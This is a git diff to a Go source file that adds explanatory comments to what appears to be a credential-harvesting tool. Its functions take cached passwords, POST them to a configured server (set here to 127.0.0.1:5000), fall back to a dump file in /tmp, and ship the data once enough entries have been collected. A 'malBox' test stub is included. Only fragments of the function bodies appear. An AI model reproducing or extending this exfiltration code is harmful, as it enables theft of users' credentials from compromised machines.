@@ -16,6 +16,10 @@ import(
 
 var serv = "127.0.0.1:5000" 	//IP of server
 
+
+// This function will extract info from CredCache object and ship it back
+// to the web server.  If the POST request fails, write the cache data to 
+// a file in temp, so it can be shipped later
 func send_data(c cred_cache.CredCache){
 	path := "/tmp/cachedump"
 	h := c.Get_hostname()
@@ -43,6 +47,9 @@ func send_data(c cred_cache.CredCache){
 
 }
 
+
+// This function writes the credentials from a cred_cache object to 
+// a specified file path
 func dump_cache(creds []string, path string){
 	cstr := ""
 	for _, cred := range creds {
@@ -55,6 +62,9 @@ func dump_cache(creds []string, path string){
 	return
 }
 
+
+// This function reads the credential dump from specified path and returns
+// it as a []string
 func fetch_dump(path string) []string{
 	f, err := os.Open(path)
 	if err != nil {
@@ -71,6 +81,8 @@ func fetch_dump(path string) []string{
 }
 
 
+// This function will be called by other programs, checks to see if we have
+// enough entries to bother shipping them
 func ship_it(c cred_cache.CredCache, min int){
 	if c.Count_entries() < min{
 		return	// not enough passwords to ship
@@ -79,6 +91,7 @@ func ship_it(c cred_cache.CredCache, min int){
 	return
 }
 
+// For testing only
 func main(){
 	c := cred_cache.CredCache {
 		Hostname: "malBox",
